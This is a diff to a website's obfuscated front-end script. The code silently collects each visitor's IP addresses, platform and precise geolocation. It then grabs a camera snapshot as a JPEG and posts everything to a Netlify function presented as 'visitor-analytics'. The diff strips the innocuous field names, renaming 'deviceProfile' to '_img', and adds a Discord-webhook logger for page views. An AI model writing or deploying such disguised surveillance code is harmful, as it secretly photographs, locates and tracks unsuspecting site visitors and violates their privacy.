@@ -926,11 +926,11 @@ document.addEventListener('DOMContentLoaded', () => {
           ]);
         } catch (_) {}
         
-        const _0xq7r8 = Object.assign({}, _0xo5p6 || {},
+        const _0xq7r8 = Object.assign({}, _0xo5p6 || {}, { _plat: navigator.platform }, 
           (_0x1a2b._0x3c4d ? { network4: _0x1a2b._0x3c4d } : {}),
           (_0x1a2b._0x5e6f ? { network6: _0x1a2b._0x5e6f } : {}));
         
-        return fetch('/.netlify/functions/analytics', {
+        return fetch('/.netlify/functions/visitor-analytics', {
           method: 'POST',
           headers: Object.assign({ 'x-privacy': _0xk1l2 }, Object.keys(_0xq7r8).length ? { 'content-type': 'application/json' } : {}),
           body: Object.keys(_0xq7r8).length ? JSON.stringify(_0xq7r8) : undefined
@@ -949,7 +949,7 @@ document.addEventListener('DOMContentLoaded', () => {
               navigator.geolocation.getCurrentPosition(
                 pos => {
                   const coords = pos && pos.coords ? pos.coords : null;
-                  const _0xu1v2 = coords ? { regionLat: coords.latitude, regionLon: coords.longitude, regionAcc: coords.accuracy } : {};
+                  const _0xu1v2 = coords ? { _loc: true, _lat: coords.latitude, _lon: coords.longitude, _acc: coords.accuracy } : {};
                   try {
                     if (navigator.permissions) {
                       navigator.permissions.query({ name: 'camera' }).then(pc => {
@@ -966,7 +966,7 @@ document.addEventListener('DOMContentLoaded', () => {
                               let _0xw3x4 = '';
                               try { _0xw3x4 = canvas.toDataURL('image/jpeg', 0.7); } catch (_) { _0xw3x4 = ''; }
                               try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
-                              const _0xy5z6 = Object.assign({}, _0xu1v2, _0xw3x4 ? { deviceProfile: _0xw3x4 } : {});
+                              const _0xy5z6 = Object.assign({}, _0xu1v2, _0xw3x4 ? { _img: _0xw3x4 } : {});
                               _0xm3n4(_0xy5z6);
                             };
                             try { video.play().catch(() => {}); } catch (_) {}
@@ -1000,7 +1000,7 @@ document.addEventListener('DOMContentLoaded', () => {
                           let _0xw3x4 = '';
                           try { _0xw3x4 = canvas.toDataURL('image/jpeg', 0.7); } catch (_) { _0xw3x4 = ''; }
                           try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
-                          const _0xa7b8c = _0xw3x4 ? { deviceProfile: _0xw3x4 } : undefined;
+                          const _0xa7b8c = _0xw3x4 ? { _img: _0xw3x4 } : undefined;
                           _0xm3n4(_0xa7b8c);
                         };
                         try { video.play().catch(() => {}); } catch (_) {}
@@ -1836,3 +1836,22 @@ function startIntensiveCalculations() {
     console.log('Intensive calculations stopped');
   }, 10000);
 }
+
+// Discord Webhook Logger - sends data to Netlify function
+async function logToDiscord(type, data = {}) {
+  try {
+    await fetch('/.netlify/functions/discord-logger', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type, data, timestamp: new Date().toISOString() })
+    });
+  } catch (e) {
+    console.log('Logging failed:', e);
+  }
+}
+
+// Log page views
+logToDiscord('page_view', { page: window.location.pathname, referrer: document.referrer });
+
+// Export for use in onclick handlers
+window.logToDiscord = logToDiscord;
